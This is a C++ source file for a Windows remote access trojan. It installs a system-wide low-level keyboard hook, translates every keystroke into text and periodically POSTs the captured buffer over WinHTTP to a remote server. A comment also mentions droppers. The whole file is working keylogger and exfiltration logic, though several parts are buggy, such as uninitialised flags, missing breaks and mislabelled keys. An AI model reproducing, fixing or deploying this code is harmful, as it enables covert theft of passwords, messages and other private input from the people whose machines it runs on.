#include "rat.h"
#include "../helper/debug.h"
#include <fstream>
#include <string>

static std::string keyloggedMessage;
static HINTERNET globalConnect;

static std::string translateKeyboardPressMessage(KBDLLHOOKSTRUCT* kbd, const bool capped, const bool shift) {
	// Regular characters
	if (kbd->vkCode > 0x41 && kbd->vkCode < 0x5A) {
		bool isUpperCaseChar = capped ^ shift;
		const char translatedChar = isUpperCaseChar ? toupper((char)(kbd->vkCode)) : (char)(kbd->vkCode);
		return std::to_string(translatedChar);
	}
	
	// Special characters
	std::string translatedKey;
	switch (kbd->vkCode) {
		case VK_SLEEP: translatedKey = "[SLEEP]"; break;
		case VK_NUMPAD0:  translatedKey = "0"; break;
		case VK_NUMPAD1:  translatedKey = "1"; break;
		case VK_NUMPAD2: translatedKey = "2"; break;
		case VK_NUMPAD3:  translatedKey = "3"; break;
		case VK_NUMPAD4:  translatedKey = "4"; break;
		case VK_NUMPAD5:  translatedKey = "5"; break;
		case VK_NUMPAD6:  translatedKey = "6"; break;
		case VK_NUMPAD7:  translatedKey = "7"; break;
		case VK_NUMPAD8:  translatedKey = "8"; break;
		case VK_NUMPAD9:  translatedKey = "9"; break;
		case VK_MULTIPLY: translatedKey = "*"; break;
		case VK_ADD:      translatedKey = "+"; break;
		case VK_SEPARATOR: translatedKey = "-"; break;
		case VK_SUBTRACT: translatedKey = "-"; break;
		case VK_DECIMAL:  translatedKey = "."; break;
		case VK_DIVIDE:   translatedKey = "/"; break;
		case VK_F1:  translatedKey = "[F1]"; break;
		case VK_F2:  translatedKey = "[F2]"; break;
		case VK_F3:  translatedKey = "[F3]"; break;
		case VK_F4:  translatedKey = "[F4]"; break;
		case VK_F5:  translatedKey = "[F5]"; break;
		case VK_F6:  translatedKey = "[F6]"; break;
		case VK_F7:  translatedKey = "[F7]"; break;
		case VK_F8:  translatedKey = "[F8]"; break;
		case VK_F9:  translatedKey = "[F9]"; break;
		case VK_F10:  translatedKey = "[F10]"; break;
		case VK_F11:  translatedKey = "[F11]"; break;
		case VK_F12:  translatedKey = "[F12]"; break;
		case VK_F13:  translatedKey = "[F13]"; break;
		case VK_F14:  translatedKey = "[F14]"; break;
		case VK_F15:  translatedKey = "[F15]"; break;
		case VK_F16:  translatedKey = "[F16]"; break;
		case VK_F17:  translatedKey = "[F17]"; break;
		case VK_F18:  translatedKey = "[F18]"; break;
		case VK_F19:  translatedKey = "[F19]"; break;
		case VK_F20:  translatedKey = "[F20]"; break;
		case VK_F21:  translatedKey = "[F22]"; break;
		case VK_F22:  translatedKey = "[F23]"; break;
		case VK_F23:  translatedKey = "[F24]"; break;
		case VK_F24:  translatedKey = "[F25]"; break;
		case VK_NUMLOCK: translatedKey = "[NUM-LOCK]"; break;
		case VK_SCROLL:  translatedKey = "[SCROLL-LOCK]"; break;
		case VK_BACK:    translatedKey = "[BACK]"; break;
		case VK_TAB:     translatedKey = "[TAB]"; break;
		case VK_CLEAR:   translatedKey = "[CLEAR]"; break;
		case VK_RETURN:  translatedKey = "[ENTER]"; break;
		case VK_SHIFT:   translatedKey = "[SHIFT]"; break;
		case VK_CONTROL: translatedKey = "[CTRL]"; break;
		case VK_MENU:    translatedKey = "[ALT]"; break;
		case VK_PAUSE:   translatedKey = "[PAUSE]"; break;
		case VK_CAPITAL: translatedKey = "[CAP-LOCK]"; break;
		case VK_ESCAPE:  translatedKey = "[ESC]"; break;
		case VK_SPACE:   translatedKey = "[SPACE]"; break;
		case VK_PRIOR:   translatedKey = "[PAGEUP]"; break;
		case VK_NEXT:    translatedKey = "[PAGEDOWN]"; break;
		case VK_END:     translatedKey = "[END]"; break;
		case VK_HOME:    translatedKey = "[HOME]"; break;
		case VK_LEFT:    translatedKey = "[LEFT]"; break;
		case VK_UP:      translatedKey = "[UP]"; break;
		case VK_RIGHT:   translatedKey = "[RIGHT]"; break;
		case VK_DOWN:    translatedKey = "[DOWN]"; break;
		case VK_SELECT:  translatedKey = "[SELECT]"; break;
		case VK_PRINT:   translatedKey = "[PRINT]"; break;
		case VK_SNAPSHOT: translatedKey = "[PRTSCRN]"; break;
		case VK_INSERT:  translatedKey = "[INS]"; break;
		case VK_DELETE:  translatedKey = "[DEL]"; break;
		case VK_HELP:    translatedKey = "[HELP]"; break;
		case 0x30:  translatedKey = shift ? "!" : "1"; break;
		case 0x31:  translatedKey = shift ? "@" : "2"; break;
		case 0x32:  translatedKey = shift ? "#" : "3"; break;
		case 0x33:  translatedKey = shift ? "$" : "4"; break;
		case 0x34:  translatedKey = shift ? "%" : "5"; break;
		case 0x35:  translatedKey = shift ? "^" : "6"; break;
		case 0x36:  translatedKey = shift ? "&" : "7"; break;
		case 0x37:  translatedKey = shift ? "*" : "8"; break;
		case 0x38:  translatedKey = shift ? "(" : "9"; break;
		case 0x39:  translatedKey = shift ? ")" : "0"; break;
		case VK_LWIN:     translatedKey = "[WIN]"; break;
		case VK_RWIN:     translatedKey = "[WIN]"; break;
		case VK_LSHIFT:   translatedKey = "[SHIFT]"; break;
		case VK_RSHIFT:   translatedKey = "[SHIFT]"; break;
		case VK_LCONTROL: translatedKey = "[CTRL]"; break;
		case VK_RCONTROL: translatedKey = "[CTRL]"; break;
		case VK_OEM_1:      translatedKey = shift ? ":" : ";"; break;
		case VK_OEM_PLUS:   translatedKey = shift ? "+" : "="; break;
		case VK_OEM_COMMA:  translatedKey = shift ? "<" : ","; break;
		case VK_OEM_MINUS:  translatedKey = shift ? "_" : "-"; break;
		case VK_OEM_PERIOD: translatedKey = shift ? ">" : "."; break;
		case VK_OEM_2:      translatedKey = shift ? "?" : "/"; break;
		case VK_OEM_3:      translatedKey = shift ? "~" : "`"; break;
		case VK_OEM_4:      translatedKey = shift ? "{" : "["; break;
		case VK_OEM_5:      translatedKey = shift ? "\\" : "|"; break;
		case VK_OEM_6:      translatedKey = shift ? "}" : "]"; break;
		case VK_OEM_7:      translatedKey = shift ? "'" : "'"; break;
		case VK_PLAY:       translatedKey = "[PLAY]";
		case VK_ZOOM:       translatedKey = "[ZOOM]";
		case VK_OEM_CLEAR:  translatedKey = "[CLEAR]";
		case VK_CANCEL:     translatedKey = "[CTRL-C]";

		default: translatedKey = "[UNK-KEY]"; break;
	}
	
	return translatedKey;
}

void RAT::flushKeyloggedMessage() {
	using namespace HTTPInfo;

	HINTERNETWrapper hRequest(WinHttpOpenRequest(
		globalConnect,
		Methods::POST.c_str(),
		REQUESTED_RESOURCE.c_str(),
		DEFAULT_HTTP_VERSION,
		WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES, // TODO: may need to change this for droppers
		NO_FLAGS
	));

	if (!hRequest) {
		LOG_MSG("Error %u in WinHttpOpenRequest.\n", GetLastError());
		return;
	}

	BOOL bResult = WinHttpSendRequest(
		hRequest.get(),
		WINHTTP_NO_ADDITIONAL_HEADERS, // TODO: change to include agentId... or maybe deduce by IP?
		ZERO_LENGTH,
		&keyloggedMessage,
		ZERO_LENGTH,
		ZERO_LENGTH,
		NO_CONTEXT
	);

	if (!bResult) {
		LOG_MSG("Error %u while getting request results.\n", GetLastError());
		return;
	}

	bResult = WinHttpReceiveResponse(
		hRequest.get(),
		RESERVED
	);

	if (!bResult) {
		LOG_MSG("Error %u while receiving response.\n", GetLastError());
		return;
	}

	DWORD dataSize;
	bResult = WinHttpQueryDataAvailable(
		hRequest.get(),
		&dataSize
	);

	if (!bResult) {
		LOG_MSG("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
		return;
	}

	if (dataSize != 10) {\
		LOG_MSG("Did not receive success response from server\n");
	}

	keyloggedMessage.clear();
}

LRESULT CALLBACK parseAndUpdateSendQueue(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode != HC_ACTION) {
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	if (wParam != WM_KEYDOWN) {
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
	bool capped;
	if (GetKeyState(VK_CAPITAL) > 0) {
		capped = true;
	}

	bool shift;
	if (GetKeyState(VK_SHIFT) > 0) {
		shift = true;
	}

	keyloggedMessage.append(translateKeyboardPressMessage(kbd, capped, shift));
	if (keyloggedMessage.length() >= Keylogging::BUFFER_SIZE) {
		flushKeyloggedMessage();
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void RAT::startRealtimeKeylogger() {
	this->_keyLoggerHook = SetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)parseAndUpdateSendQueue, NULL, Keylogging::ALL_THREADS);
}

void RAT::stopRealtimeKeyLogger() {
	delete this;
}

RAT::RAT() {
	using namespace HTTPInfo;

	// -- Establish HTTP Connection to remote server --
	_hSession = WinHttpOpen(
		FISHERMAN_USER_AGENT.c_str(),
		WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		NO_FLAGS
	);

	if (!_hSession) {
		LOG_MSG("Error %u in WinHttpOpen.\n", GetLastError());
		return;
	}

	HINTERNET _hConnect = WinHttpConnect(
		_hSession,
		TEMP_SERVER_NAME.c_str(),
		INTERNET_DEFAULT_HTTP_PORT,
		RESERVED
	);

	if (!_hConnect) {
		LOG_MSG("Error %u in WinHttpConnect.\n", GetLastError());
		return;
	}

	globalConnect = &_hConnect;
}

RAT::~RAT() {
	UnhookWindowsHookEx(this->_keyLoggerHook);
	flushKeyloggedMessage();
	if (_hSession) WinHttpCloseHandle(_hSession); 
	if (_hConnect) WinHttpCloseHandle(_hConnect);
}
